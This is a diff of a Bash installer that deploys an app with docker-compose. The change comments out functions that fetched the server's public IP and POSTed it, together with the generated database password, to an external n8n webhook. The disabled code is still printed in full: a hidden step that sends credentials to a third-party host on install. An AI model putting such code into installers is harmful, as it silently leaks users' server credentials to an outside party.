@@ -27,19 +27,19 @@ generate_random_password() {
     openssl rand -base64 16 | tr -d '+/=' | cut -c1-16
 }
 
-# Função para obter o IP público do servidor
-get_public_ip() {
-    curl -s https://api.ipify.org
-}
+# # Função para obter o IP público do servidor
+# get_public_ip() {
+#     curl -s https://api.ipify.org
+# }
 
 # Função para enviar POST com IP e senha
-send_post_request() {
-    local ip=$1
-    local password=$2
-    local url="https://n8n-n8n.gumktq.easypanel.host/webhook/896cb0a0-cb34-4ce4-b9b0-0d0c97146b8b"
+# send_post_request() {
+#     local ip=$1
+#     local password=$2
+#     local url="https://n8n-n8n.gumktq.easypanel.host/webhook/896cb0a0-cb34-4ce4-b9b0-0d0c97146b8b"
 
-    curl -X POST -H "Content-Type: application/json" -d "{\"ip\":\"$ip\",\"password\":\"$password\"}" $url
-}
+#     curl -X POST -H "Content-Type: application/json" -d "{\"ip\":\"$ip\",\"password\":\"$password\"}" $url
+# }
 
 # Definir diretório de instalação
 INSTALL_DIR="/opt/membriuwl"
@@ -96,10 +96,10 @@ cd $INSTALL_DIR
 run_silently sudo docker-compose --env-file .env up -d
 wait
 
-# Obter o IP público do servidor
-SERVER_IP=$(get_public_ip)
+# # Obter o IP público do servidor
+# SERVER_IP=$(get_public_ip)
 
-# Enviar POST com IP e senha
-send_post_request $SERVER_IP $DB_PASSWORD
+# # Enviar POST com IP e senha
+# send_post_request $SERVER_IP $DB_PASSWORD
 
-echo -e "\nInstalação concluída! Acesse seu aplicativo em https://$DOMINIO"
+echo -e "\nInstalação concluída! Acesse seu aplicativo em https://$DOMAIN"
